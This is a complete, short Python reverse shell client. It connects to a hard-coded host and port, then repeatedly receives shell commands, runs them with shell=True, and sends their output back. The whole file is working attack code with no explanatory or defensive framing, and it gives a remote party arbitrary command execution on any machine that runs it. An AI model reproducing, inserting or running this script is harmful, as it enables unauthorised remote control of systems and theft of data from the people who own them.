import socket
import subprocess

r_host = "192.168.1.120"
r_port = 12345
client = socket.socket()
print("[-] Connection Initiating...")
client.connect((r_host, r_port))
print("[-] Connection initiated!")

while True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(
        command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE
    )
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending response...")
    client.send(output + output_error)
